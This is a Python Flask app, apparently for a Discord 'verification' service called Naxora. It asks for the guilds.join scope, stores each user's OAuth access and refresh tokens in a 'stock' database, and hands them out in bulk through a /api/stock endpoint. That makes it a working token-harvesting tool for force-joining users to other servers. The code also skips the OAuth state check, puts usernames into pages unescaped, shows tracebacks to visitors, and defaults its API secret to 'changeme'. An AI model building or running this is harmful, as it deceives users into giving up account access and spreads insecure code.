import os
import sqlite3
import secrets
import traceback
import requests
from datetime import datetime, timedelta
from functools import wraps
from urllib.parse import quote

from flask import Flask, redirect, request, session, jsonify

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", secrets.token_hex(32))

# ── Config ────────────────────────────────────────────────────────────────────
DISCORD_CLIENT_ID     = os.getenv("DISCORD_CLIENT_ID",     "").strip()
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET", "").strip()
DISCORD_REDIRECT_URI  = os.getenv("DISCORD_REDIRECT_URI",  "").strip()
VERIFY_SECRET         = os.getenv("VERIFY_SECRET",         "changeme").strip()
DB_PATH               = os.getenv("DB_PATH",               "db/memberstock.db").strip()

DISCORD_API   = "https://discord.com/api/v10"
DISCORD_OAUTH = "https://discord.com/oauth2/authorize"
TOKEN_URL     = "https://discord.com/api/oauth2/token"

# ── Shared CSS ────────────────────────────────────────────────────────────────
CSS = """<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;
     min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#161616;border:1px solid #2a2a2a;border-radius:16px;padding:44px 40px;
      max-width:460px;width:100%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,.5)}
.icon{font-size:52px;margin-bottom:14px}
h1{font-size:22px;font-weight:700;color:#fff;margin-bottom:10px}
p{color:#888;font-size:15px;line-height:1.65;margin-bottom:16px}
.badge{display:inline-block;padding:5px 16px;border-radius:20px;font-size:13px;
       font-weight:600;margin-bottom:18px}
.green{background:rgba(87,242,135,.12);color:#57f287;border:1px solid rgba(87,242,135,.25)}
.red{background:rgba(237,66,69,.12);color:#ed4245;border:1px solid rgba(237,66,69,.25)}
.yellow{background:rgba(254,231,92,.12);color:#fee75c;border:1px solid rgba(254,231,92,.25)}
.row{background:#1e1e1e;border:1px solid #2a2a2a;border-radius:9px;padding:11px 15px;
     margin-bottom:9px;text-align:left;font-size:14px}
.row span{color:#666;font-size:11px;display:block;margin-bottom:2px}
.err{background:#1a0a0a;border:1px solid #3a1a1a;border-radius:9px;padding:12px 15px;
     margin:12px 0;text-align:left;font-size:12px;color:#ed4245;word-break:break-all;
     white-space:pre-wrap;max-height:200px;overflow-y:auto}
.avatar{width:76px;height:76px;border-radius:50%;border:3px solid #5865F2;
        margin:0 auto 16px;display:block}
.btn{display:inline-block;margin-top:8px;background:#5865F2;color:#fff;border-radius:8px;
     padding:13px 28px;font-weight:600;text-decoration:none;font-size:15px}
.btn:hover{background:#4752c4}
.ok{color:#57f287}.no{color:#ed4245}
code{background:#111;padding:2px 6px;border-radius:4px;font-size:12px;color:#ccc}
</style>"""


def page(body):
    return (f"<!DOCTYPE html><html><head><meta charset=UTF-8>"
            f"<meta name=viewport content='width=device-width,initial-scale=1'>"
            f"<title>Naxora Verify</title>{CSS}</head><body>{body}</body></html>")


# ── Database — init runs at module load so it always works ────────────────────

def _ensure_dir():
    d = os.path.dirname(DB_PATH)
    if d:
        os.makedirs(d, exist_ok=True)

def get_db():
    _ensure_dir()
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    _ensure_dir()
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS stock (
            user_id       INTEGER PRIMARY KEY,
            access_token  TEXT,
            refresh_token TEXT,
            expires_at    TEXT,
            added_at      TEXT DEFAULT (datetime('now'))
        )
    """)
    conn.commit()
    conn.close()

# Always init on import — works whether run via `python app.py` or gunicorn
init_db()


# ── Global 500 handler — shows real error instead of blank page ───────────────

@app.errorhandler(Exception)
def handle_exception(e):
    tb = traceback.format_exc()
    return page(f"""
<div class="card">
  <div class="icon">💥</div>
  <span class="badge red">Server Error</span>
  <h1>Something Went Wrong</h1>
  <p>The server hit an unexpected error. Details below:</p>
  <div class="err">{str(e)}\n\n{tb[-1000:]}</div>
  <p style="font-size:13px;color:#555;margin-top:10px">
    <a href="/" style="color:#5865F2">← Go back</a>
  </p>
</div>"""), 500


def require_secret(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if auth != f"Bearer {VERIFY_SECRET}":
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated


# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return page("""
<div class="card">
  <div class="icon">🛡️</div>
  <h1>Naxora Verification</h1>
  <p>Open Discord and click the <strong>Verify Now</strong> button
  in the <strong>#verify</strong> channel to authorize.</p>
  <p style="font-size:13px;color:#444">
    <a href="/config-check" style="color:#5865F2">Server config check →</a>
  </p>
</div>""")


@app.route("/authorize")
def authorize():
    """Discord button should link here: /authorize?guild=GUILD_ID"""
    if not DISCORD_CLIENT_ID or not DISCORD_REDIRECT_URI:
        return page("""
<div class="card">
  <div class="icon">⚙️</div>
  <span class="badge yellow">Not Configured</span>
  <h1>Missing Environment Variables</h1>
  <p>Set <code>DISCORD_CLIENT_ID</code> and <code>DISCORD_REDIRECT_URI</code>
  in your Render dashboard, then redeploy.</p>
</div>"""), 500

    state    = secrets.token_urlsafe(16)
    guild_id = request.args.get("guild", "")
    session["state"]    = state
    session["guild_id"] = guild_id

    params = (
        f"client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={quote(DISCORD_REDIRECT_URI, safe='')}"
        f"&response_type=code"
        f"&scope=identify%20guilds.join"
        f"&state={state}"
        f"&prompt=none"
    )
    return redirect(f"{DISCORD_OAUTH}?{params}")


@app.route("/callback")
def callback():
    """Discord sends the user here after they click Authorize."""

    # Cancelled
    if request.args.get("error"):
        return page("""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">Cancelled</span>
  <h1>Authorization Denied</h1>
  <p>You cancelled. Go back to Discord and click the verify button again.</p>
</div>""")

    code = request.args.get("code", "").strip()
    if not code:
        return page("""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">No Code</span>
  <h1>Missing Authorization Code</h1>
  <p>Discord didn't send a code. Please try again from Discord.</p>
</div>""")

    # Check env vars
    missing = [v for v, val in [
        ("DISCORD_CLIENT_ID",     DISCORD_CLIENT_ID),
        ("DISCORD_CLIENT_SECRET", DISCORD_CLIENT_SECRET),
        ("DISCORD_REDIRECT_URI",  DISCORD_REDIRECT_URI),
    ] if not val]

    if missing:
        rows = "".join(f"<div class='row'><span>Missing</span><code>{v}</code></div>" for v in missing)
        return page(f"""
<div class="card">
  <div class="icon">⚙️</div>
  <span class="badge red">Not Configured</span>
  <h1>Missing Environment Variables</h1>
  {rows}
  <p style="margin-top:12px">
    Set these on Render and redeploy, then try again.
  </p>
</div>"""), 500

    # ── Step 1: Exchange code for tokens ──────────────────────────────────────
    try:
        token_resp = requests.post(
            TOKEN_URL,
            data={
                "client_id":     DISCORD_CLIENT_ID,
                "client_secret": DISCORD_CLIENT_SECRET,
                "grant_type":    "authorization_code",
                "code":          code,
                "redirect_uri":  DISCORD_REDIRECT_URI,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15,
        )
    except Exception as e:
        return page(f"""
<div class="card">
  <div class="icon">🌐</div>
  <span class="badge red">Network Error</span>
  <h1>Can't Reach Discord</h1>
  <p>Check your server's internet access.</p>
  <div class="err">{e}</div>
</div>"""), 502

    if token_resp.status_code != 200:
        try:
            derr = token_resp.json()
            detail = f"{derr.get('error','')}: {derr.get('error_description','')}"
        except Exception:
            detail = token_resp.text[:300]

        # "invalid_grant" = code already used (page refresh) — give friendly message
        if "invalid_grant" in detail or "invalid_grant" in token_resp.text:
            return page(f"""
<div class="card">
  <div class="icon">🔄</div>
  <span class="badge yellow">Code Already Used</span>
  <h1>Already Authorized</h1>
  <p>This code was already used (you may have refreshed the page).<br><br>
  <strong>Go back to Discord</strong> and click the verify button again to get a fresh code.</p>
  <p style="font-size:13px;color:#444;margin-top:8px">
    If you already verified successfully, you're all set!
  </p>
</div>""")

        return page(f"""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">Token Error — {token_resp.status_code}</span>
  <h1>Code Exchange Failed</h1>
  <p>Discord rejected the token request. Most common reasons:</p>
  <div class="row"><span>1 — Wrong redirect_uri</span>
    <code>DISCORD_REDIRECT_URI</code> must exactly match Discord → OAuth2 → Redirects.<br>
    Current: <code>{DISCORD_REDIRECT_URI}</code>
  </div>
  <div class="row"><span>2 — Wrong client secret</span>
    Check <code>DISCORD_CLIENT_SECRET</code> in your Render dashboard.
  </div>
  <div class="err">{detail}</div>
  <a href="/config-check" style="color:#5865F2;font-size:14px">Check config →</a>
</div>"""), 400

    tokens        = token_resp.json()
    access_token  = tokens.get("access_token", "")
    refresh_token = tokens.get("refresh_token", "")
    expires_in    = int(tokens.get("expires_in", 604800))

    if not access_token:
        return page("""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">Error</span>
  <h1>No Access Token</h1>
  <p>Discord returned 200 OK but no access token. Please try again.</p>
</div>"""), 500

    # ── Step 2: Fetch user info ───────────────────────────────────────────────
    try:
        user_resp = requests.get(
            f"{DISCORD_API}/users/@me",
            headers={"Authorization": f"Bearer {access_token}"},
            timeout=10,
        )
    except Exception as e:
        return page(f"""
<div class="card">
  <div class="icon">🌐</div>
  <span class="badge red">Network Error</span>
  <h1>Can't Reach Discord API</h1>
  <div class="err">{e}</div>
</div>"""), 502

    # 401 = token missing `identify` scope — direct them to re-auth with correct scopes
    if user_resp.status_code == 401:
        guild_id = session.pop("guild_id", "") or request.args.get("guild", "")
        params   = (
            f"client_id={DISCORD_CLIENT_ID}"
            f"&redirect_uri={quote(DISCORD_REDIRECT_URI, safe='')}"
            f"&response_type=code"
            f"&scope=identify%20guilds.join"
            f"&prompt=consent"
            + (f"&state={guild_id}" if guild_id else "")
        )
        return page(f"""
<div class="card">
  <div class="icon">🔄</div>
  <span class="badge yellow">Wrong Scope</span>
  <h1>Re-authorize Required</h1>
  <p>You authorized without the <code>identify</code> scope.<br>
  Click below to authorize again with the correct permissions.</p>
  <a class="btn" href="{DISCORD_OAUTH}?{params}">🔗 Authorize Again</a>
</div>""")

    if user_resp.status_code != 200:
        return page(f"""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">Error {user_resp.status_code}</span>
  <h1>Profile Fetch Failed</h1>
  <div class="err">{user_resp.text[:300]}</div>
</div>"""), 500

    user     = user_resp.json()
    user_id  = int(user["id"])
    username = user.get("global_name") or user.get("username", "Unknown")
    avatar   = user.get("avatar")
    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png?size=128"
        if avatar else
        f"https://cdn.discordapp.com/embed/avatars/{(user_id >> 22) % 6}.png"
    )

    expires_at = (datetime.utcnow() + timedelta(seconds=expires_in)).strftime("%Y-%m-%d %H:%M:%S")
    added_at   = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    # ── Step 3: Store in database ─────────────────────────────────────────────
    try:
        conn = get_db()
        conn.execute("""
            INSERT OR REPLACE INTO stock
                (user_id, access_token, refresh_token, expires_at, added_at)
            VALUES (?, ?, ?, ?, ?)
        """, (user_id, access_token, refresh_token, expires_at, added_at))
        conn.commit()
        total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
        conn.close()
    except Exception as e:
        return page(f"""
<div class="card">
  <div class="icon">🗄️</div>
  <span class="badge red">Database Error</span>
  <h1>Failed to Save</h1>
  <p>Your token was received but could not be saved to the database.</p>
  <div class="err">{e}\n{traceback.format_exc()[-500:]}</div>
</div>"""), 500

    # ── Step 4: Optional — add to guild + give Verified role immediately ───────
    guild_id         = session.pop("guild_id", "") or request.args.get("guild", "")
    bot_token        = os.getenv("BOT_TOKEN",        "").strip()
    verified_role_id = os.getenv("VERIFIED_ROLE_ID", "").strip()
    role_given       = False

    if guild_id and bot_token:
        try:
            add = requests.put(
                f"{DISCORD_API}/guilds/{guild_id}/members/{user_id}",
                json={"access_token": access_token},
                headers={"Authorization": f"Bot {bot_token}", "Content-Type": "application/json"},
                timeout=10,
            )
            if verified_role_id and add.status_code in (200, 201, 204):
                requests.put(
                    f"{DISCORD_API}/guilds/{guild_id}/members/{user_id}/roles/{verified_role_id}",
                    headers={"Authorization": f"Bot {bot_token}"},
                    timeout=10,
                )
                role_given = True
        except Exception:
            pass

    role_row = (
        '<div class="row"><span>Role</span><span class="ok">✅ Verified role assigned</span></div>'
        if role_given else
        '<div class="row"><span>Status</span>✅ Saved — use <code>!join</code> in Discord to add</div>'
    )

    return page(f"""
<div class="card">
  <img src="{avatar_url}" class="avatar" alt="avatar">
  <span class="badge green">✓ Verified</span>
  <h1>You're Verified!</h1>
  <p>Your account is saved. You can close this tab and return to Discord.</p>
  <div class="row"><span>Username</span>{username}</div>
  <div class="row"><span>Discord ID</span>{user_id}</div>
  <div class="row"><span>Verified At (UTC)</span>{added_at}</div>
  {role_row}
  <p style="margin-top:16px;font-size:13px;color:#555">
    User #{total} in the verified database.
  </p>
</div>""")


# ── Config check ──────────────────────────────────────────────────────────────

@app.route("/config-check")
def config_check():
    def row(name, val, note=""):
        if val:
            preview = val[:4] + "*" * min(len(val)-4, 12) if len(val) > 4 else "****"
            s = f'<span class="ok">✅ Set</span> <code>{preview}</code>'
        else:
            s = f'<span class="no">❌ NOT SET</span>'
        return f'<div class="row"><span>{name}</span>{s} {note}</div>'

    # DB check
    try:
        conn = get_db()
        total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
        conn.close()
        db_status = f'<span class="ok">✅ Connected ({total} users)</span>'
    except Exception as e:
        db_status = f'<span class="no">❌ Error: {e}</span>'

    return page(f"""
<div class="card" style="max-width:520px">
  <div class="icon">⚙️</div>
  <h1>Config Check</h1>
  {row("DISCORD_CLIENT_ID", DISCORD_CLIENT_ID)}
  {row("DISCORD_CLIENT_SECRET", DISCORD_CLIENT_SECRET)}
  {row("DISCORD_REDIRECT_URI", DISCORD_REDIRECT_URI)}
  {row("FLASK_SECRET_KEY", os.getenv("FLASK_SECRET_KEY",""))}
  {row("VERIFY_SECRET", VERIFY_SECRET if VERIFY_SECRET != "changeme" else "")}
  {row("BOT_TOKEN", os.getenv("BOT_TOKEN",""), "(optional)")}
  <div class="row"><span>Database</span>{db_status}</div>
  <div class="row">
    <span>DISCORD_REDIRECT_URI set to</span>
    <code style="word-break:break-all">{DISCORD_REDIRECT_URI or "— not set —"}</code>
  </div>
  <div class="row">
    <span>This must also be added in Discord → OAuth2 → Redirects</span>
    <a href="https://discord.com/developers/applications" target="_blank"
       style="color:#5865F2;font-size:13px">Open Discord Developer Portal →</a>
  </div>
</div>""")


# ── Bot API ───────────────────────────────────────────────────────────────────

@app.route("/api/stock")
@require_secret
def api_stock():
    limit  = request.args.get("limit",  type=int)
    offset = request.args.get("offset", 0, type=int)
    conn   = get_db()
    total  = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    q      = "SELECT user_id, access_token, refresh_token, added_at FROM stock ORDER BY added_at DESC"
    rows   = conn.execute(q + (" LIMIT ? OFFSET ?" if limit else ""),
                          (limit, offset) if limit else ()).fetchall()
    conn.close()
    return jsonify({
        "total": total,
        "count": len(rows),
        "users": [{"user_id": r["user_id"], "access_token": r["access_token"],
                   "refresh_token": r["refresh_token"], "added_at": r["added_at"]}
                  for r in rows],
    })

@app.route("/api/count")
@require_secret
def api_count():
    conn  = get_db()
    total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    conn.close()
    return jsonify({"total": total})

@app.route("/api/stock/<int:user_id>", methods=["DELETE"])
@require_secret
def api_delete(user_id):
    conn = get_db()
    conn.execute("DELETE FROM stock WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({"success": True})

@app.route("/health")
def health():
    conn  = get_db()
    total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    conn.close()
    return jsonify({"status": "ok", "total_verified": total})


# ── Start ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    port  = int(os.getenv("PORT", 5000))
    debug = os.getenv("FLASK_DEBUG", "false").lower() == "true"
    print(f"[NAXORA] Port         : {port}")
    print(f"[NAXORA] Redirect URI : {DISCORD_REDIRECT_URI or 'NOT SET'}")
    print(f"[NAXORA] Client ID    : {(DISCORD_CLIENT_ID[:6] + '...') if DISCORD_CLIENT_ID else 'NOT SET'}")
    print(f"[NAXORA] Client Secret: {'SET' if DISCORD_CLIENT_SECRET else 'NOT SET'}")
    print(f"[NAXORA] DB Path      : {DB_PATH}")
    app.run(host="0.0.0.0", port=port, debug=debug)
